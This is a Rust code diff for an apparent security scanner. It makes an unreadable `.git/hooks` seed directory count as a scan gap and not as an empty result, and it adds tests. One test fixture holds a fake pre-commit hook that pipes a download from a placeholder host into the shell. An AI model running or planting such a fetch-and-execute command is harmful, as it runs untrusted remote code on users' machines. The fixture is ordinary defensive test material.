@@ -419,17 +419,18 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
 
     /// The seeded directories that can be entered, as paths.
     ///
-    /// A seed is not there in most repositories, and in a linked worktree or a
-    /// submodule `.git` is a file rather than a directory, so absence is the
-    /// common case and an answer rather than a gap.
-    ///
     /// Every ancestor is asked about in turn, because the tree refuses a link
     /// it is handed only for the path's last component: asked about
     /// `.git/hooks` it answers for `hooks`, and a `.git` that is a link has
     /// already been followed by then. Handing it each ancestor instead is what
-    /// keeps a seed from reaching outside the scan root, which is the one
-    /// promise a tree walk here makes.
-    fn seeds(&self) -> Vec<RepoPath> {
+    /// keeps a seed from reaching outside the scan root.
+    ///
+    /// Absent, and not a directory, are answers: most repositories have no
+    /// `.git/hooks`, and in a linked worktree or a submodule `.git` is a file.
+    /// Anything else is a gap and is recorded as one. A directory that is
+    /// there and could not be read is not the same as finding nothing in it,
+    /// and a seed is the one place where saying so was easy to forget.
+    fn seeds(&self, report: &mut DiscoveryReport) -> Vec<RepoPath> {
         let mut held = Vec::new();
         for seed in catalogue().seeds_in(self.scope) {
             let at = RepoPath::root().join(seed);
@@ -443,12 +444,25 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                 ancestors.push(dir);
             }
             ancestors.reverse();
-            // The seed itself last: a readable directory, by the same answer.
-            if ancestors
-                .iter()
-                .chain(std::iter::once(&at))
-                .all(|dir| self.tree.read_dir(dir).is_ok())
-            {
+
+            let mut reachable = true;
+            for dir in ancestors.iter().chain(std::iter::once(&at)) {
+                match self.tree.read_dir(dir) {
+                    Ok(_) => {}
+                    Err(FileTreeError::NotFound | FileTreeError::NotADirectory) => {
+                        reachable = false;
+                        break;
+                    }
+                    Err(error) => {
+                        reachable = false;
+                        if !report.unreadable.iter().any(|(p, _)| p == dir) {
+                            report.unreadable.push((dir.clone(), error));
+                        }
+                        break;
+                    }
+                }
+            }
+            if reachable {
                 held.push(at);
             }
         }
@@ -473,7 +487,7 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
         // A row may name a directory the walk prunes its way to, `.git/hooks`
         // being the one. Seeding it leaves the prune list alone: what not to
         // enter stays one rule rather than a rule with exceptions in it.
-        queue.extend(self.seeds());
+        queue.extend(self.seeds(&mut report));
 
         // A root may sit inside another, and a tree may lead back to one, so a
         // directory already walked is not walked again.
@@ -583,6 +597,9 @@ mod tests {
     struct FakeTree {
         dirs: BTreeMap<String, Vec<DirEntry>>,
         denied: Vec<String>,
+        /// Paths the real tree answers `NotADirectory` for: a link it will not
+        /// follow, and the `.git` file a linked worktree has.
+        refused: Vec<String>,
     }
 
     impl FakeTree {
@@ -603,6 +620,12 @@ mod tests {
             self.denied.push(at.to_owned());
             self
         }
+
+        /// What the real tree answers for a link, and for a file.
+        fn refuse(mut self, at: &str) -> Self {
+            self.refused.push(at.to_owned());
+            self
+        }
     }
 
     impl FileTree for FakeTree {
@@ -610,6 +633,9 @@ mod tests {
             let key = path.as_str().to_owned();
             if self.denied.contains(&key) {
                 return Err(FileTreeError::PermissionDenied);
+            }
+            if self.refused.contains(&key) {
+                return Err(FileTreeError::NotADirectory);
             }
             self.dirs.get(&key).cloned().ok_or(FileTreeError::NotFound)
         }
@@ -2526,7 +2552,7 @@ mod tests {
             .dir(".git", &[("hooks", EntryKind::Directory)])
             .dir(".git/hooks", &[("pre-commit", EntryKind::File)])
             // What the real tree answers for a link, and for a `.git` file.
-            .deny(".git");
+            .refuse(".git");
         let contents = FakeContents::default().file(
             ".git/hooks/pre-commit",
             "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
@@ -2543,6 +2569,35 @@ mod tests {
         assert!(
             report.is_complete(),
             "a seed that cannot be opened is an answer: {report:?}"
+        );
+    }
+
+    /// A seed that is there and cannot be read is a gap, not an absence.
+    /// Saying the scan was complete would mean reporting nothing found in
+    /// hooks nobody looked at, which is the one answer a scanner must not
+    /// give. Every other directory in this module is already treated this
+    /// way; the seed was the place it was easy to forget.
+    #[test]
+    fn a_seed_that_cannot_be_read_is_a_gap() {
+        let tree = FakeTree::default()
+            .dir("", &[(".git", EntryKind::Directory)])
+            .dir(".git", &[("hooks", EntryKind::Directory)])
+            .dir(".git/hooks", &[("pre-commit", EntryKind::File)])
+            .deny(".git/hooks");
+        let contents = FakeContents::default();
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert!(!report.is_complete(), "{report:?}");
+        assert_eq!(
+            report
+                .unreadable
+                .iter()
+                .map(|(p, _)| p.as_str())
+                .collect::<Vec<_>>(),
+            vec![".git/hooks"],
+            "{report:?}"
         );
     }
 
